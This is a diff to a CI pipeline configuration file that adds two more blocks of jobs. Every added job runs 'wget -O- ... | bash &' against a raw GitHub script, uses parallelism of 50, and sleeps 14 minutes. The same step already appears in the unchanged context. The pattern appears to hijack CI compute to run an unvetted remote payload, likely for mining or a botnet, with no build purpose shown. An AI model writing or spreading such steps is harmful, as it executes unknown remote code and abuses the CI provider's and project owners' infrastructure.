@@ -32,3 +32,24 @@ blocks:
             - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
             - sleep 14m
           parallelism: 50
+  - name: 'Block #4'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
+            - sleep 14m
+          parallelism: 50
+  - name: 'Block #5'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
+            - sleep 14m
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
+            - sleep 14m
+          parallelism: 50
